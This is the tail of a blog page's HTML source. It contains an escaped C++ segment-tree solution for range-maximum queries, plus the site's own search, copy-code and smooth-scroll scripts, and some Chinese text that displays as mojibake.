&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;msup&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;/msup&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;R&lt;/mi&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;msup&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;1&amp;lt;=n&amp;lt;=10^5,1&amp;lt;=L,R&amp;lt;=n,0&amp;lt;a[i]&amp;lt;10^3&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68354em;vertical-align:-0.0391em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.5782em;vertical-align:-0.0391em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.008548em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8777699999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.00773em;&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8388800000000001em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;Q&lt;/mi&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;msup&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mn&gt;5&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;1&amp;lt;=Q&amp;lt;=10^5&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68354em;vertical-align:-0.0391em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8777699999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;Q&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#define ll long long
#define lc num&amp;lt;&amp;lt;1
#define rc num&amp;lt;&amp;lt;1|1
#define N 100001
#include&amp;lt;bits/stdc++.h&amp;gt;
using namespace std;
int n,l,r,q;
ll a[N];
struct node{
    int l,r,num;
    ll val,add;
}tre[N*4];
void pushup(int num)
{
    tre[num].val=max(tre[lc].val,tre[rc].val);
}
void build_tre(int l,int r,int num)
{
    tre[num].l=l;tre[num].r=r;
    if(l==r)
    {
        tre[num].val=a[l];
        return ;
    }
    int mid=(tre[num].l+tre[num].r)&amp;gt;&amp;gt;1;
    build_tre(l,mid,lc);
    build_tre(mid+1,r,rc);
    pushup(num);
}
ll query_itv(int l,int r,int num)
{
    ll ans=-0x3f;
    if(tre[num].l&amp;gt;=l&amp;amp;&amp;amp;tre[num].r&amp;lt;=r)
    {
        return tre[num].val;
    }
    int mid=(tre[num].l+tre[num].r)&amp;gt;&amp;gt;1;
    if(l&amp;lt;=mid) ans=max(ans,query_itv(l,r,lc));
    if(r&amp;gt;mid) ans=max(ans,query_itv(l,r,rc));
    return ans;
}

signed main()
{
    scanf(&amp;quot;%d&amp;quot;,&amp;amp;n);
    for(int i=1;i&amp;lt;=n;i++)
    {
        scanf(&amp;quot;%lld&amp;quot;,&amp;amp;a[i]);
    }
    build_tre(1,n,1);
    // cout&amp;lt;&amp;lt;tre[1].val;
    scanf(&amp;quot;%d&amp;quot;,&amp;amp;q);
    while(q--)
    {
        scanf(&amp;quot;%d %d&amp;quot;,&amp;amp;l,&amp;amp;r);
        printf(&amp;quot;%lld\n&amp;quot;,query_itv(l,r,1));
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
">çº¿æ®µæ ‘ç»´æŠ¤åŒºé—´æœ€å€¼é—®é¢˜</a>
      </div>
      
    </div>
    <div class="page">
      <div id="page_ul"></div>
    </div>
  </div>
</div>
<script>
  !function () {
    let searchMask = document.querySelector('#search_mask');
    let result = document.querySelector('#result');
    let items = document.querySelectorAll('.item');
    let searchBox = document.querySelector('#search');
    let statCount = document.querySelector('#stat_count');
    let statTimes = document.querySelector('#stat_times');
    let pageUl = document.querySelector('#page_ul');
    let close = document.querySelector('#close');
    
    close.addEventListener('click', function() {
      searchMask.style = 'display: none;'
    })

    let finds = [];
    let contents = [];
    let pageSize = 10;
    items.forEach(item => {
      let a = item.querySelector('a');
      contents.push({
        title: a.innerText,
        details: a.dataset.c,
        link: a.href
      })
      item.remove();
    })

    function insertStr(soure, start, count) {
      let newStr = soure.substr(start, count);
      return soure.slice(0, start) + '<em>' + newStr + '</em>' + soure.slice(start + count);
    }

    pageUl.addEventListener('click', function(event) {
      let target = event.target;
      if (target.__proto__ === HTMLSpanElement.prototype) {
        appendResults(parseInt(target.dataset.i));
      }
    })

    function appendResults(index) {
      let htmlResult = '';
      let start = index || 0;
      let end = Math.min(start + pageSize, finds.length);
      for (let i = start; i < end; i++) {
        const current = finds[i];
        let html = current.title;
        let sum = 0;
        let positions = current.positions;
        positions.forEach(position => {
          html = insertStr(html, position.start + sum, position.count);
          sum += 9;
        })
        htmlResult += `<div class="item"><a class="result-title" href="${current.link}">${html}</a></div>`;
      }
      result.innerHTML = htmlResult;
      pageUl.innerHTML = '';
      let count = finds.length / pageSize;
      let lis = '';
      if (start !== 0) {
        lis += `<span class="fa fa-angle-left" data-i='${start - 1}'></span>`;
      }
      for (let i = 0; i < count; i++) {
        lis += `<span class='${i === start?'current':''}' data-i='${i}'>${i+1}</span>`;     
      }
      if (start+1 < count) {
        lis += `<span class="fa fa-angle-right" data-i='${start+1}'></span>`;  
      }
      pageUl.innerHTML = lis;
    }

    function search(delay) {
      let timer = null
      return function () {
        clearTimeout(timer)
        timer = setTimeout(() => {
          let start = Date.now();
          let segments = searchBox.value.split(' ').filter(c => c != '');
          if (segments.length <= 0) {
            return;
          }
          finds = [];
          let htmlResult = '';
          contents.forEach(content => {
            let title = content.title;
            let positions = [];
            let find = false;
            segments.forEach((segment) => {
              if (content.title.includes(segment)) {
                find = true;
                positions.push({
                  start: content.title.indexOf(segment),
                  count: segment.length
                })
              } else if (content.details.includes(segment)) {
                find = true;
              }
            });
            if (find) {
              finds.push({
                title: content.title,
                link: content.link,
                positions
              });
            }
          })
          appendResults(0);
          statCount.textContent = finds.length;
          statTimes.textContent = Date.now() - start;
        }, delay)
      }
    }
    searchBox.addEventListener('input', search(200));
  }()
</script>

<input hidden id="copy" />
<script>
  !function () {
    let times = document.querySelectorAll('.publish-time');
    for (let i = 0; i < times.length; i++) {
      let date = times[i].dataset.t;
      let time = Math.floor((new Date().getTime() - new Date(date).getTime()) / 1000);
      if (time < 60) {
        str = time + 'ç§’ä¹‹å‰';
      } else if (time < 3600) {
        str = Math.floor(time / 60) + 'åˆ†é’Ÿä¹‹å‰';
      } else if (time >= 3600 && time < 86400) {
        str = Math.floor(time / 3600) + 'å°æ—¶ä¹‹å‰';
      } else if (time >= 86400 && time < 259200) {
        str = Math.floor(time / 86400) + 'å¤©ä¹‹å‰';
      } else {
        str = times[i].textContent;
      }
      times[i].textContent = str;
    }
  }();
</script>

<script>
  let language = '';
  if (language !== '') {
    let map = new Map();
    if (language === 'en') {
      map.set('search', 'Search');
      map.set('category', 'Categories');
      map.set('article', 'Articles');
      map.set('tag', 'Tags');
      map.set('top', 'Top');
      map.set('publish', 'published');
      map.set('minute', ' minutes');
      map.set('read-more', 'Read More');
      map.set('view', 'View');
      map.set('words', ' words');
      map.set('category-in', 'category in');
      map.set('preview', 'Meta');
      map.set('index', 'Toc');
      map.set('no-archives', "You haven't created yet");
      map.set('archives', " articles in total");
      map.set('cloud-tags', " tags in total");
      map.set('copyright', "Copyright: ");
      map.set('author', "Author: ");
      map.set('link', "Link: ");
      map.set('leave-message', "Leave a message");
      map.set('format', "Links Format");
      map.set('site-name', "Name: ");
      map.set('site-link', "Link: ");
      map.set('site-desc', "Desc: ");
      map.set('stat', " related results, taking ");
      map.set('stat-time', " ms");
      map.set('site-img', "Image: ");
    }

    if (map.size > 0) {
      let lanElems = document.querySelectorAll('.language');
      lanElems.forEach(elem => {
        let lan = elem.dataset.lan, text = map.get(lan);
        if (elem.__proto__ === HTMLInputElement.prototype) {
          elem.placeholder = text
        } else {
          if (elem.dataset.count) {
            text = elem.dataset.count + text;
          }
          elem.textContent = text;
        }
      })
    }
  }

  window.Clipboard = (function (window, document, navigator) {
    var textArea,
      copy;

    // åˆ¤æ–­æ˜¯ä¸æ˜¯iosç«¯
    function isOS() {
      return navigator.userAgent.match(/ipad|iphone/i);
    }
    //åˆ›å»ºæ–‡æœ¬å…ƒç´ 
    function createTextArea(text) {
      textArea = document.createElement('textArea');
      textArea.value = text;
      textArea.style.width = 0;
      textArea.style.height = 0;
      textArea.clientHeight = 0;
      textArea.clientWidth = 0;
      document.body.appendChild(textArea);
    }
    //é€‰æ‹©å†…å®¹
    function selectText() {
      var range,
        selection;

      if (isOS()) {
        range = document.createRange();
        range.selectNodeContents(textArea);
        selection = window.getSelection();
        selection.removeAllRanges();
        selection.addRange(range);
        textArea.setSelectionRange(0, 999999);
      } else {
        textArea.select();
      }
    }

    //å¤åˆ¶åˆ°å‰ªè´´æ¿
    function copyToClipboard() {
      try {
        document.execCommand("Copy")
      } catch (err) {
        alert("å¤åˆ¶é”™è¯¯ï¼è¯·æ‰‹åŠ¨å¤åˆ¶ï¼")
      }
      document.body.removeChild(textArea);
    }

    copy = function (text) {
      createTextArea(text);
      selectText();
      copyToClipboard();
    };

    return {
      copy: copy
    };
  })(window, document, navigator);

  function copyCode(e) {
    if (e.srcElement.tagName === 'SPAN' && e.srcElement.classList.contains('copy-code')) {
      let code = e.currentTarget.querySelector('code');
      var text = code.innerText;
      if (e.srcElement.textContent === 'å¤åˆ¶æˆåŠŸ') {
        return;
      }
      e.srcElement.textContent = 'å¤åˆ¶æˆåŠŸ';
      (function (elem) {
        setTimeout(() => {
          if (elem.textContent === 'å¤åˆ¶æˆåŠŸ') {
            elem.textContent = 'å¤åˆ¶ä»£ç '
          }
        }, 1000);
      })(e.srcElement)
      Clipboard.copy(text);
    }
  }

  let pres = document.querySelectorAll('pre');
  pres.forEach(pre => {
    let code = pre.querySelector('code');
    let copyElem = document.createElement('span');
    copyElem.classList.add('copy-code');
    copyElem.textContent = 'å¤åˆ¶ä»£ç ';
    pre.appendChild(copyElem);
    pre.onclick = copyCode
  })

</script>
<script src="/media/js/motion.js"></script>


  <script
    src="https://cdn.jsdelivr.net/gh/cferdinandi/smooth-scroll/dist/smooth-scroll.polyfills.min.js"></script>
  <script>
    var scroll = new SmoothScroll('a[href*="#"]', {
      speed: 200
    });
  </script>







</html>